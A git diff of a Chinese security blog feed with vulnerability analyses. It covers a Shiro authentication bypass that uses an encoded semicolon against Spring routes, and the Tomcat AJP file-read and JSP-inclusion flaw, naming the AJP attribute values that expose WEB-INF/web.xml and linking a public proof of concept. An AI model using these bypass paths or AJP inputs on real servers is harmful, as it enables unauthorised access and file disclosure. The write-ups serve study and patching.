+<figure data-type="image" tabindex="10"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210323112933.png" alt="image-20210323112933541" loading="lazy"></figure>
+<p>再跟进<code>getPathWithinApplication</code>方法，再跟进其中的<code>getRequestUri</code>：</p>
+<figure data-type="image" tabindex="11"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210323113043.png" alt="image-20210323113042970" loading="lazy"></figure>
+<figure data-type="image" tabindex="12"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210323113107.png" alt="image-20210323113107844" loading="lazy"></figure>
+<p>在<code>decodeAndClenUriString</code>方法中会进行URL的处理：</p>
+<figure data-type="image" tabindex="13"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210323113151.png" alt="image-20210323113151080" loading="lazy"></figure>
+<p>这三个方法的具体逻辑不再赘述，之前的文章就已经分析过了，由于此时的URL中为<code>%3b</code>，是经过URL编码的<code>;</code>号，所以在<code>removeSemicolonContent</code>方法中并不会被截断，之后在<code>decodeRequestString</code>中进行URLdeocde：</p>
+<figure data-type="image" tabindex="14"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210323113437.png" alt="image-20210323113437660" loading="lazy"></figure>
+<p>最后<code>getPathWithinServletMapping</code>方法的最终返回值就为<code>/admin/;auth</code>：</p>
+<figure data-type="image" tabindex="15"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210323113713.png" alt="image-20210323113713247" loading="lazy"></figure>
+<p>由于Map设置为<code>/admin/{name}</code>，那么此时的<code>/admin/;auth</code>就可以匹配该规则（<code>{name}</code>就为<code>;auth</code>），然后获取到对应的<code>Controller</code>，请求被Spring正常处理：</p>
+<figure data-type="image" tabindex="16"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210323114050.png" alt="image-20210323114050123" loading="lazy"></figure>
+<p>这样看来，如果Spring的路由设置方式为<strong>固定路由</strong>的话（比如<code>/admin/auth</code>），则无法进行匹配，最终会返回404。</p>
+<h1 id="修复">修复</h1>
+<p>shiro层会将URL先进行decode，然后进入分号截断；Spring层会先将URL进行分号截断，之后再进行deocde，正是两者的这个差异导致的漏洞的发生。</p>
+<ul>
+<li>
+<p>可以通过修改匹配规则，比如<code>/admin/**</code>来解决</p>
+<figure data-type="image" tabindex="17"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210323134745.png" alt="image-20210323134745085" loading="lazy"></figure>
+<figure data-type="image" tabindex="18"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210323134635.png" alt="image-20210323134635432" loading="lazy"></figure>
+</li>
+<li>
+<p>shiro1.6.0的解决方案是增加了一个类<code>InvalidRequestFilter</code>来对<code>;</code>号进行拦截：</p>
+<figure data-type="image" tabindex="19"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210323134857.png" alt="image-20210323134857922" loading="lazy"></figure>
+<p>但是我本地使用shiro1.6.0版本测试的时候发现%3b仍然可以绕过（<strong>待解决</strong>）：</p>
+<figure data-type="image" tabindex="20"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210323184115.png" alt="image-20210323184115519" loading="lazy"></figure>
+<figure data-type="image" tabindex="21"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210323184139.png" alt="image-20210323184139893" loading="lazy"></figure>
+</li>
+</ul>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[Shiro复盘--权限绕过（三）]]></title>
         <id>https://f4de-bak.github.io/post/8Mpx_LGdo/</id>
@@ -143,7 +514,7 @@
 <figure data-type="image" tabindex="9"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210319004024.png" alt="image-20210319004024544" loading="lazy"></figure>
 <p>主要看<code>decodeAndCleanUriString</code>方法，这个方法中对请求的路由做了一些处理：</p>
 <figure data-type="image" tabindex="10"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210319004119.png" alt="image-20210319004119307" loading="lazy"></figure>
-<p>跟入第一个方法<code>removeSemicolonContent</code>，经过这部分代码处理之后<code>/;/admin</code>变成了<code>//admin</code>：</p>
+<p>跟入第一个方法<code>removeSemicolonContent</code>，经过这部分代码处理之后<code>/;/admin</code>变成了<code>//admin</code>（这部分的逻辑就是把URL中<code>;xxx/</code>的<code>;xxx</code>部分去掉）：</p>
 <figure data-type="image" tabindex="11"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210319004437.png" alt="image-20210319004437224" loading="lazy"></figure>
 <p>再跟入第三个方法<code>getSanitizedPath</code>，在获取到<code>//</code>的索引值之后，直接删除该索引上对应的字符，<code>//admin</code>也就变了<code>/admin</code>：</p>
 <figure data-type="image" tabindex="12"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210319004636.png" alt="image-20210319004636257" loading="lazy"></figure>
@@ -279,7 +650,7 @@ public class shiroConfig {
 ]]></content>
     </entry>
     <entry>
-        <title type="html"><![CDATA[Tomcat AJP协议漏洞复现]]></title>
+        <title type="html"><![CDATA[Tomcat AJP协议漏洞]]></title>
         <id>https://f4de-bak.github.io/post/JB6ZNGMXX/</id>
         <link href="https://f4de-bak.github.io/post/JB6ZNGMXX/">
         </link>
@@ -322,8 +693,9 @@ public class shiroConfig {
 <p>以下面的tomcat文件目录做对照：</p>
 <figure data-type="image" tabindex="4"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210315160205.png" alt="image-20210315160205337" loading="lazy"></figure>
 <p><em>Webapps</em>目录代表一个Host，而其下的每个目录都对应着一个Context，其中ROOT目录存放着主应用，其他目录存放着子应用。当我们访问Context的时候，如果是ROOT目录下的，则可以直接通过<code>www.xxx.com/</code>来访问，而如果要访问其他子目录，则需要通过<code>www.xxx.com/docs</code>来访问。当然，主应用目录是可以修改的，默认情况下为ROOT目录。</p>
+<figure data-type="image" tabindex="5"><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/img/20210324093716.png" alt="tomcat" loading="lazy"></figure>
 <p>Tomcat处理一个请求的流程大致如下：</p>
-<figure data-type="image" tabindex="5"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210315145747.png" alt="image-20201013113437489" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210315145747.png" alt="image-20201013113437489" loading="lazy"></figure>
 <ol>
 <li>在获取到TCP/IP数据包的时候，会交给Processor将解析，并封装成我们熟悉的request和response对象，然后传递给下一步处理。</li>
 <li>Engine来进行Host、Context、Mapping中Servlet的匹配。</li>
@@ -332,11 +704,11 @@ public class shiroConfig {
 <h1 id="ajp数据包处理">AJP数据包处理</h1>
 <p>对于HTTP请求和AJP请求的数据包，在封装成request和response对象之后的流程并无差别，主要区别就是对socket流量处理和Processor解析的过程不同。</p>
 <p><code>org.apache.coyote.Processor</code>接口提供了这些功能，对于不同的协议，有不同的接口实现类。负责处理AJP请求的实现类为<code>AjpProcessor</code>：</p>
-<figure data-type="image" tabindex="6"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210315161900.png" alt="image-20210315161900016" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210315161900.png" alt="image-20210315161900016" loading="lazy"></figure>
 <p>在<code>AjpProcessor</code>的<code>service()</code>方法中调用了<code>prepareRequest()</code>方法进行数据预处理：</p>
-<figure data-type="image" tabindex="7"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316105726.png" alt="image-20210315162453835" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316105726.png" alt="image-20210315162453835" loading="lazy"></figure>
 <p>而之后会调用Adapter来将请求交给Container来处理：</p>
-<figure data-type="image" tabindex="8"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210315162639.png" alt="image-20210315162639014" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210315162639.png" alt="image-20210315162639014" loading="lazy"></figure>
 <p>AJP协议中的漏洞，就出现在<code>prepareRequest()</code>方法中。</p>
 <h1 id="漏洞复现">漏洞复现</h1>
 <p>poc：https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</p>
@@ -429,55 +801,55 @@ public class shiroConfig {
 </li>
 <li>
 <p>在根目录里新建<code>home</code>文件夹，把<code>webapps</code>和<code>conf</code>文件夹放入<code>home</code>文件夹中：</p>
-<figure data-type="image" tabindex="9"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316001210.png" alt="image-20210316001203592" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316001210.png" alt="image-20210316001203592" loading="lazy"></figure>
 </li>
 <li>
 <p>在IDEA中导入项目，选择我们新建的pom.xml文件：</p>
-<figure data-type="image" tabindex="10"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316001439.png" alt="image-20210316001439225" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316001439.png" alt="image-20210316001439225" loading="lazy"></figure>
 </li>
 </ol>
-<figure data-type="image" tabindex="11"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316001506.png" alt="image-20210316001506159" loading="lazy"></figure>
+<figure data-type="image" tabindex="12"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316001506.png" alt="image-20210316001506159" loading="lazy"></figure>
 <ol start="5">
 <li>
 <p>导入项目之后，将<code>java</code>文件夹标记为<code>Sources Root</code>，把<code>test</code>文件夹标记为<code>Test Sources Root</code>：</p>
-<figure data-type="image" tabindex="12"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316001733.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="13"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316001733.png" alt="" loading="lazy"></figure>
 </li>
 <li>
 <p>把 <code>home/webapps/examples/WEB-INF/classes/trailers</code> 目录拷贝到 <code>test</code> 目录下：</p>
-<figure data-type="image" tabindex="13"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316001838.png" alt="image-20210316001838650" loading="lazy"></figure>
+<figure data-type="image" tabindex="14"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316001838.png" alt="image-20210316001838650" loading="lazy"></figure>
 </li>
 <li>
 <p>把 <code>home/webapps/examples/WEB-INF/classes/util/CookieFilter.java</code> 文件拷贝到 <code>test/util</code> 目录下：</p>
-<figure data-type="image" tabindex="14"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316001919.png" alt="image-20210316001919101" loading="lazy"></figure>
+<figure data-type="image" tabindex="15"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316001919.png" alt="image-20210316001919101" loading="lazy"></figure>
 </li>
 <li>
 <p>找到 <code>BootStrap</code>类的<code>main</code>方法，运行，这时候应该会出现下面错误：</p>
-<figure data-type="image" tabindex="15"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316002035.png" alt="image-20210316002035809" loading="lazy"></figure>
+<figure data-type="image" tabindex="16"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316002035.png" alt="image-20210316002035809" loading="lazy"></figure>
 </li>
 <li>
 <p>添加VM参数：<code>-Dcatalina.home={你的项目路径}\home</code>：</p>
-<figure data-type="image" tabindex="16"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316002211.png" alt="image-20210316002211736" loading="lazy"></figure>
+<figure data-type="image" tabindex="17"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316002211.png" alt="image-20210316002211736" loading="lazy"></figure>
 </li>
 <li>
 <p>在<code>org.apache.catalina.startup.ContextConfig</code>类中的<code>configureStart</code>方法中添加<code>context.addServletContainerInitializer(new JasperInitializer(), null);</code>，用于初始化JSP解析器：</p>
-<figure data-type="image" tabindex="17"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316002433.png" alt="image-20210316002433890" loading="lazy"></figure>
+<figure data-type="image" tabindex="18"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316002433.png" alt="image-20210316002433890" loading="lazy"></figure>
 </li>
 <li>
 <p>删除 <code>home/webapps/examples</code> 文件夹，然后运行 <code>main</code> 方法，访问<code>127.0.0.1:8080</code>：</p>
-<figure data-type="image" tabindex="18"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316002617.png" alt="image-20210316002617780" loading="lazy"></figure>
+<figure data-type="image" tabindex="19"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316002617.png" alt="image-20210316002617780" loading="lazy"></figure>
 </li>
 <li>
 <p>同时可以看到8009端口已经开放：</p>
 </li>
 </ol>
-<figure data-type="image" tabindex="19"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210315144452.png" alt="image-20210315144452701" loading="lazy"></figure>
+<figure data-type="image" tabindex="20"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210315144452.png" alt="image-20210315144452701" loading="lazy"></figure>
 <h2 id="文件读取">文件读取</h2>
 <p>在<code>AjpProcessor#prepareRequest</code>方法打上断点，调试启动tomcat，并使用POC来发送ajp请求：</p>
-<figure data-type="image" tabindex="20"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210315163242.png" alt="image-20210315163241922" loading="lazy"></figure>
+<figure data-type="image" tabindex="21"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210315163242.png" alt="image-20210315163241922" loading="lazy"></figure>
 <p>在699行出进行了数据包头部信息的读取，当头设置为<code>SC_A_REQ_ATTRIBUTE</code>的时候，则会读取出n和v：</p>
-<figure data-type="image" tabindex="21"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210315163647.png" alt="image-20210315163647369" loading="lazy"></figure>
+<figure data-type="image" tabindex="22"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210315163647.png" alt="image-20210315163647369" loading="lazy"></figure>
 <p>然后当n不为<code>SC_A_REQ_LOCAL_ADDR</code>、<code>SC_A_REQ_REMOTE_PORT</code>、<code>SC_A_SSL_PROTOCOL</code>的时候，会用v来对n进行赋值：</p>
-<figure data-type="image" tabindex="22"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210315163728.png" alt="image-20210315163728511" loading="lazy"></figure>
+<figure data-type="image" tabindex="23"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210315163728.png" alt="image-20210315163728511" loading="lazy"></figure>
 <p>POC中发送的数据包一共会读取三次：</p>
 <pre><code>n = javax.servlet.include.request_uri	v = /
 
@@ -486,51 +858,51 @@ n = javax.servlet.include.path_info		v = WEB-INF/web.xml
 n = javax.servlet.include.servlet_path	v = /
 </code></pre>
 <p>对应POC中的这一部分代码：</p>
-<figure data-type="image" tabindex="23"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210315164145.png" alt="image-20210315164145601" loading="lazy"></figure>
+<figure data-type="image" tabindex="24"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210315164145.png" alt="image-20210315164145601" loading="lazy"></figure>
 <p>之后进入<code>getAdapter().service()</code>方法中，这里可以看到我们请求的URL为<code>/asdf</code>：</p>
-<figure data-type="image" tabindex="24"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210315164452.png" alt="image-20210315164452905" loading="lazy"></figure>
+<figure data-type="image" tabindex="25"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210315164452.png" alt="image-20210315164452905" loading="lazy"></figure>
 <p><code>/asdf</code>这个路由是我们故意构造的一个不存在的路由，当路由无法匹配对应的servlet的时候会由<code>org.apache.catalina.servlets.DefaultServlet</code>来处理请求，是在<code>{CATALINA_HOME}/conf/web.xml</code>中默认配置的：</p>
-<figure data-type="image" tabindex="25"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210315164813.png" alt="image-20210315164813262" loading="lazy"></figure>
-<figure data-type="image" tabindex="26"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316004730.png" alt="image-20210316004730879" loading="lazy"></figure>
+<figure data-type="image" tabindex="26"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210315164813.png" alt="image-20210315164813262" loading="lazy"></figure>
+<figure data-type="image" tabindex="27"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316004730.png" alt="image-20210316004730879" loading="lazy"></figure>
 <p>在<code>DefaultServlet</code>的<code>service()</code>方法中打下断点，当我们请求方式为<code>GET</code>方式的时候，存在<code>service()-&gt;doGet()-&gt;serveResource()</code>的调用链：</p>
-<figure data-type="image" tabindex="27"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316003333.png" alt="image-20210316003333899" loading="lazy"></figure>
+<figure data-type="image" tabindex="28"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316003333.png" alt="image-20210316003333899" loading="lazy"></figure>
 <p>再贴一个调用栈：</p>
-<figure data-type="image" tabindex="28"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316003409.png" alt="image-20210316003409095" loading="lazy"></figure>
+<figure data-type="image" tabindex="29"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316003409.png" alt="image-20210316003409095" loading="lazy"></figure>
 <p>在<code>serveResource()</code>中调用了<code>getRelativePath()</code>方法：</p>
-<figure data-type="image" tabindex="29"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316003649.png" alt="image-20210316003649513" loading="lazy"></figure>
+<figure data-type="image" tabindex="30"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316003649.png" alt="image-20210316003649513" loading="lazy"></figure>
 <p>在这个方法中会读取出我们POC中构造的恶意属性，然后把两个属性拼接成一个path：</p>
-<figure data-type="image" tabindex="30"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316003825.png" alt="image-20210316003824993" loading="lazy"></figure>
+<figure data-type="image" tabindex="31"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316003825.png" alt="image-20210316003824993" loading="lazy"></figure>
 <p>然后在<code>serveResource()</code>方法中会把这个path传入<code>resources.getResource()</code>方法中造成任意文件读取：</p>
-<figure data-type="image" tabindex="31"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316003942.png" alt="image-20210316003942820" loading="lazy"></figure>
+<figure data-type="image" tabindex="32"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316003942.png" alt="image-20210316003942820" loading="lazy"></figure>
 <p>之后会把根据path获取到文件资源序列化输出，这样客户端再根据AJP协议的数据包进行解包，就能读取到文件内容了：</p>
-<figure data-type="image" tabindex="32"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316004240.png" alt="image-20210316004240365" loading="lazy"></figure>
+<figure data-type="image" tabindex="33"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316004240.png" alt="image-20210316004240365" loading="lazy"></figure>
 <h2 id="jsp文件包含">JSP文件包含</h2>
 <p>Tomcat会将以<code>.jsp、.jspx</code>结尾的url交给<code>org.apache.jasper.servlet.JspServlet</code>来处理：</p>
-<figure data-type="image" tabindex="33"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316010505.png" alt="image-20210316010505803" loading="lazy"></figure>
-<figure data-type="image" tabindex="34"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316010516.png" alt="image-20210316010516564" loading="lazy"></figure>
+<figure data-type="image" tabindex="34"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316010505.png" alt="image-20210316010505803" loading="lazy"></figure>
+<figure data-type="image" tabindex="35"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316010516.png" alt="image-20210316010516564" loading="lazy"></figure>
 <p>所以我们可以修改POC中的请求路径：</p>
-<figure data-type="image" tabindex="35"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316011052.png" alt="image-20210316011052683" loading="lazy"></figure>
+<figure data-type="image" tabindex="36"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316011052.png" alt="image-20210316011052683" loading="lazy"></figure>
 <p>然后再<code>JspServlet#service</code>方法中打下断点：</p>
-<figure data-type="image" tabindex="36"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316012336.png" alt="image-20210316012336568" loading="lazy"></figure>
+<figure data-type="image" tabindex="37"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316012336.png" alt="image-20210316012336568" loading="lazy"></figure>
 <p>这里同样会获取<code>INCLUDE_SERVLET_PATH</code>和<code>INCLUDE_PATH_INFO</code>两个属性，而这两个属性是可通过构造AJP请求数据包来控制的，这两个属性拼接到<code>jspUri</code>之后，会进入到<code>serviceJsp</code>方法：</p>
-<figure data-type="image" tabindex="37"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316012711.png" alt="image-20210316012711652" loading="lazy"></figure>
+<figure data-type="image" tabindex="38"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316012711.png" alt="image-20210316012711652" loading="lazy"></figure>
 <p>这个方法会把<code>jspUri</code>（上述为<code>/WEB-INF/testfile</code>）所表示的文件解析为JSP文件，从而形成文件包含：</p>
-<figure data-type="image" tabindex="38"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316013019.png" alt="image-20210316013019379" loading="lazy"></figure>
+<figure data-type="image" tabindex="39"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316013019.png" alt="image-20210316013019379" loading="lazy"></figure>
 <p>值得注意的是，这个所包含的文件和我们请求的url（<code>/asdf/f4de.jsp</code>）是没有关系的。</p>
 <h1 id="其他">其他</h1>
 <h2 id="读取其他context">读取其他Context</h2>
 <p>默认情况下是读取的主目录（ROOT目录）中的文件内容，此外还可以读取其他Context中文件的内容，只需要修改一下请求的url即可（文件包含同理）：</p>
-<figure data-type="image" tabindex="39"><img src="https://i.loli.net/2021/03/16/4zv5V8bDfcwEPTL.png" alt="image-20210316102141936" loading="lazy"></figure>
-<figure data-type="image" tabindex="40"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316104937.png" alt="image-20210316102213823" loading="lazy"></figure>
+<figure data-type="image" tabindex="40"><img src="https://i.loli.net/2021/03/16/4zv5V8bDfcwEPTL.png" alt="image-20210316102141936" loading="lazy"></figure>
+<figure data-type="image" tabindex="41"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316104937.png" alt="image-20210316102213823" loading="lazy"></figure>
 <h2 id="目录穿越可读性">目录穿越可读性</h2>
 <p>我们尝试穿越出webapps这个目录，读取其他文件夹中的内容：</p>
 <p><code>DefaultServlet#serveResource</code>打下断点，在<code>resources.getResource</code>方法中：</p>
-<figure data-type="image" tabindex="41"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316104946.png" alt="image-20210316103039869" loading="lazy"></figure>
-<figure data-type="image" tabindex="42"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316105005.png" alt="image-20210316103129512" loading="lazy"></figure>
+<figure data-type="image" tabindex="42"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316104946.png" alt="image-20210316103039869" loading="lazy"></figure>
+<figure data-type="image" tabindex="43"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316105005.png" alt="image-20210316103129512" loading="lazy"></figure>
 <p>跟进<code>RequestUtil.normalize</code>：</p>
-<figure data-type="image" tabindex="43"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316105018.png" alt="image-20210316103339267" loading="lazy"></figure>
+<figure data-type="image" tabindex="44"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316105018.png" alt="image-20210316103339267" loading="lazy"></figure>
 <p>只要包含<code>/../</code>，就会返回<code>null</code>，直接抛出异常：</p>
-<figure data-type="image" tabindex="44"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316105027.png" alt="image-20210316103512792" loading="lazy"></figure>
+<figure data-type="image" tabindex="45"><img src="https://cdn.jsdelivr.net/gh/f4de-bak/picture/picture20210316105027.png" alt="image-20210316103512792" loading="lazy"></figure>
 <h1 id="修复">修复</h1>
 <ul>
 <li>
